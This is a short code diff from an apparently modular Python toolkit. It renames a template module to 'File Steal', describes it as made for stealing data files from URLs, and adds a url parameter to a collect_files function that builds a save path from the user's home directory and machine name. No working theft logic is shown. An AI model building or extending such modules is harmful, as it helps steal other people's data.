@@ -31,12 +31,12 @@ def register_module(code: str, name: str, description: str):
 
 @register_module(
     "01",
-    "Example Module",
-    "Template showing where to add module logic.",
+    "File Steal",
+    "This module is made for stealing data files from URL'S.",
 )
 # modules/files_collection.py
 
-def collect_files():
+def collect_files(url: str):
     home_path = os.path.expanduser("~")
     pc_name = platform.uname().nodename
     save_path = os.path.join(home_path, pc_name)
